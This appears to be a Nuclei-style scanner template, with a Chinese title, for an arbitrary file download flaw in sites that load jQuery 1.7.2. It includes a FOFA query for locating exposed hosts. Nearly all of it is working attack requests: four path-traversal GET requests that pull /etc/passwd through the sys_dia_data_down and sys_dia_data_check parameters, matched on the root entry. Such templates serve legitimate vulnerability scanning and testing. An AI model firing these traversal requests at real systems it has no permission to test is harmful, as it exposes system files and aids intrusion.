id: js_query_172_read_file

info:
  name: JQuery 1.7.2 版本站点前台任意文件下载
  author: bjxsec
  severity: critical
  description: fofa  body="webui/js/jquerylib/jquery-1.7.2.min.js"
  tags: js,JQiery,bjxsec
  reference:
    - https://nosec.org/home/detail/1713.html
requests:
  - method: GET
    path:
      - "{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../etc/passwd"
      - "{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=/etc/passwd"
      - "{{BaseURL}}/webui/?g=sys_dia_data_check&file_name=../etc/passwd"
      - "{{BaseURL}}/webui/?g=sys_dia_data_check&file_name=/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:[x*]:0:0:"
        part: body
